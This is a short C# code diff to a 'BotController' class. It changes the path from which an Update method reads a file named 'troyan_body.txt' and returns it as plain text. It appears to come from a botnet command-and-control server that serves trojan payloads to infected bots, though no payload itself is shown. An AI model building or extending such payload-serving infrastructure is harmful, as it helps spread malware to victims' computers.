@@ -116,7 +116,7 @@ public class BotController: BaseController
     
     internal IActionResult Update(string server)
     {
-        var fileBytes = System.IO.File.ReadAllBytes($@"C:\data\{server}\troyan_body.txt");
+        var fileBytes = System.IO.File.ReadAllBytes(ServerModelLoader.UserDataBody(server));
         return File(fileBytes, "text/plain");
     }
 }
